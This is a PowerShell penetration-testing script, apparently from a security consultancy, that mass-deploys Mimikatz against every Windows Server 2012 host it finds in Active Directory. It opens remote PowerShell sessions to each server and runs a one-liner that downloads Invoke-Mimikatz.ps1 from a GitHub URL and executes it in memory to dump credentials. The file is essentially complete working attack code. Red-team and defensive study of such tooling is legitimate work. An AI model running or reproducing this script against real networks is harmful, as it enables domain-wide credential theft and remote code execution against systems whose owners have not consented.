# Author: Scott Sutherland (@_nullbind), 2015 NetSPI
# Description:  This can be used to massmimikatz 2012 server from a non domain system.
# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user
# Note: this is based on work done by rob fuller and will schroeder.
# todo: add option to limit number of servers.
# Just for fun.

function Get-MimikatzCreds2012
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {

        # ----------------------------------------
        # Get the list of domain computers
        # ----------------------------------------

        Write-verbose "Getting list of 2012 Servers from DC..."

        # Create data table to house results
        $TblServers2012 = New-Object System.Data.DataTable 
        $TblServers2012.Columns.Add("ComputerName") | Out-Null

        # Get domain computers from dc that are 2012
        $CompFilter = "(&(objectCategory=Computer)(operatingsystem=*2012*))"
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")         
        }

        $ObjSearcher.FindAll() | ForEach-Object {
            
            #add server to data table
            $ComputerName = [string]$_.properties.dnshostname
            $TblServers2012.Rows.Add($ComputerName) | Out-Null 
        }


        # ----------------------------------------
        # Establish sessions
        # ---------------------------------------- 
        $ServerCount = $TblServers2012.Rows.Count
        Write-verbose "Creating $ServerCount ps sessions..."

        # Create sessions 
        $Counter = 0         
        $TblServers2012 | 
        Foreach {
            $Counter = $Counter+1
            [string]$MyComputer = $_.ComputerName    
            Write-Verbose "Processing $Counter of $ServerCount - $MyComputer"         
            New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue
        }           

        # Get sessions count
        $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count


        # ----------------------------------------
        # Attempt to run mimikatz
        # ---------------------------------------- 
        if($SessionCount -ge 1){

            # run the mimikatz command
            Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
            $x = Get-PSSession
            Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1');invoke-mimikatz}

            # remove sessions
            Write-verbose "Removing ps sessions..."
            Disconnect-PSSession -Session $x
            Remove-PSSession -Session $x

            # Clear datatable
            $TblServers2012.Clear()
        
        }else{
            Write-verbose "No ps sessions could be created."
        }
        
        Write-verbose "Done."
    }

    End
    {

    }
}

